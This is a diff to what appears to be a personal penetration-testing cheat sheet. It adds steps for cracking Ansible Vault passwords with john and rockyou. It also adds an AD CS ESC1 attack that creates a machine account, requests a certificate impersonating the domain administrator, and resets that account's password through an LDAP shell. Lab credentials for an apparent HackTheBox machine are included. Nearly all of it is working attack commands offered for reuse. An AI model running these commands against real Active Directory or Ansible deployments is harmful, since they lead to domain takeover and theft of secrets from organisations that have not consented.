@@ -391,6 +391,23 @@ This will output the command result from the find command onto the filesystem.tx
 Since we did env command  from earlier and we go that $HOME is / . 
 ```
 
+### Ansible Vaults : 
+
+```bash
+===> Found Ansible files (playbooks, defaults/main.yml, etc.) on an SMB share or filesystem, containing values wrapped in !vault | blocks. These are Ansible Vault-encrypted secrets need to brute-force the vault password, then decrypt.
+
+==> Extract ONE vault block per file. Copy only the block itself (starting at $ANSIBLE_VAULT;1.1;AES256), stripping the YAML indentation (leading spaces) and any trailing junk characters. Fastest way to clean it in-place after pasting into nano:
+
+sed -i 's/^[ \t]*//' vaultfile
+
+python3 /usr/share/john/ansible2john.py vaultfile > ansible_hash
+john ansible_hash --wordlist=/usr/share/wordlists/rockyou.txt
+john --show ansible_hash
+
+==> Once cracked we can view the password :
+ansible-vault view vaultfile
+ 
+```
 
 ## Post Exploitation :
 
@@ -1176,7 +1193,31 @@ Fix :
 certipy-ad auth -pfx 'administrator.pfx' -dc-ip $target -ldap-shell
 ==> This will drop us inside an LDAP Shell : 
 #
-#change_password administrator NewPassword123!
+# change_password administrator NewPassword123!
+
+# ESC1 Via Domain Computers :
+
+certipy find might show a template vulnerable to ESC1 (Enrollee Supplies Subject + Client Authentication), but Enrollment Rights only lists Domain Computers / Domain Admins / Enterprise Admins not our current low-priv user or Authenticated Users. Since machine accounts land in Domain Computers automatically on creation, spinning one up satisfies the enrollment requirement. By default the machine account quota is 10, so we usually have room to create one.
+
+==> Verify properties first : 
+
+certipy account -u 'svc_ldap@authority.htb' -p 'lDaP_1n_th3_cle4r!' -dc-ip $target -user svc_ldap read
+
+==> Create the machine account :
+
+addcomputer.py -computer-name 'PWNED$' -computer-pass 'Passw0rd123!' -dc-ip $target authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!'
+
+==> Retry the ESC1 :
+
+certipy req -u 'PWNED$@authority.htb' -p 'Passw0rd123!' -dc-ip $target -target authority.authority.htb -ca AUTHORITY-CA -template 'CorpVPN' -upn 'administrator@authority.htb' -sid 'S-1-5-21-622327497-3269355298-2248959698-500'
+
+Then again 2 scenarios :
+
+- Normal case: returns NT hash directly, usable with secretsdump/psexec
+- If PKINIT itself fails (KDC_ERR_PADATA_TYPE_NOSUPP or similar), 
+  fall back to: certipy auth -pfx administrator.pfx -dc-ip $target -ldap-shell
+  → gives an interactive LDAP shell as the cert's identity
+  → change_password <user> <newpass> to set a usable password directly
 
 
 # ESC4 :
